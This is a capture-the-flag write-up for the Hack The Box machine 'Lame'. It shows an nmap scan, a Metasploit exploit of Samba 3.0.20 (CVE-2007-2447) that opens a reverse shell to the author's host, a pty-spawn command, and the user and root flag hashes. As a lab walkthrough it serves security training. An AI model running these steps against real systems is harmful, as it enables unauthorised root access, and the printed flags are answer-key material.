---
layout: post
title: Lame - Hackthebox
date: 2019-10-03
Author: Dark0
tags: [sample, document]
comments: true
toc: 
pinned: true
---

### Lame is a beginner box. With basic enumeration and some research you will get user and the root pretty easily.

![Box](https://i.ibb.co/z7wqbNQ/Captura-de-tela-em-2019-10-03-17-30-29.png)


# ENUMERATION

### I'll start with a basic enumeration, to do that I used nmap with flags -T4 -A -v

```
┌─[root@parrot]─[~/Documentos/htb/boxes/lame]
└──╼ #nmap -T4 -A -v 10.10.10.3

```

### We find port 21, 22, 139 and 445 open

```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.10
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Arris TG562G/CT cable modem (92%), Dell Integrated Remote Access Controller (iDRAC5) (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%), Linux 2.6.18 (ClarkConnect 4.3 Enterprise Edition) (92%), Linux 2.6.8 - 2.6.30 (92%), Dell iDRAC 6 remote access controller (Linux 2.6) (92%), Linksys WRV54G WAP (92%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.076 days (since Thu Oct  3 15:52:27 2019)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=192 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 4h00m23s, deviation: 0s, median: 4h00m23s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP\x00
|_  System time: 2019-10-03T16:41:57-04:00
|_smb2-time: Protocol negotiation failed (SMB2)


```

### I've tried exploit port 21, vsftpd 2.3.4 is indeed vulnerable but I wasn't successful. So I realized that Samba 3.0.20 was vulnerable too. I did search about samba in metasploit finding many results

```
msf5 > search samba 3.0.20

Matching Modules
================

   #   Name                                                   Disclosure Date  Rank       Check  Description
   -   ----                                                   ---------------  ----       -----  -----------
   1   auxiliary/admin/http/wp_easycart_privilege_escalation  2015-02-25       normal     Yes    WordPress WP EasyCart Plugin Privilege Escalation
   11  exploit/linux/samba/lsa_transnames_heap                2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow
   12  exploit/linux/samba/setinfopolicy_heap                 2012-04-10       normal     Yes    Samba SetInformationPolicy AuditEventsInfo Heap Overflow
   13  exploit/linux/samba/trans2open                         2003-04-07       great      No     Samba trans2open Overflow (Linux x86)
   14  exploit/multi/samba/nttrans                            2003-04-07       average    No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow
   15  exploit/multi/samba/usermap_script                     2007-05-14       excellent  No     Samba "username map script" Command Execution
   16  exploit/osx/samba/lsa_transnames_heap                  2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow

   
```
# EXPLOITATION

### Then I've used the exploit/multi/samba/usermap_script module because this version of samba is vulnerable. (CVE-2007–2447)

```
msf5 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf5 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP double handler on 10.10.14.10:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo r43tyRSiXyHwgK4g;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "r43tyRSiXyHwgK4g\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.14.10:4444 -> 10.10.10.3:48359) at 2019-10-03 18:45:37 -0300

python -c 'import pty;pty.spawn("/bin/bash")' 
root@lame:/# whoami
whoami
root
root@lame:/# cat /home/makis/user.txt
cat /home/makis/user.txt
69454a937d94f5f0225ea00acd2e84c5
root@lame:/# cat ~/root.txt
cat ~/root.txt
92caac3be140ef409e45721348a4e9df
root@lame:/# 

```
### I used python -c ‘import pty;pty.spawn(“/bin/bash”)’ to spawn a tty shell and done
### box owned!! this box is very easy, but for a beginner it's definitely a great box.

### Stay in peace, guys!



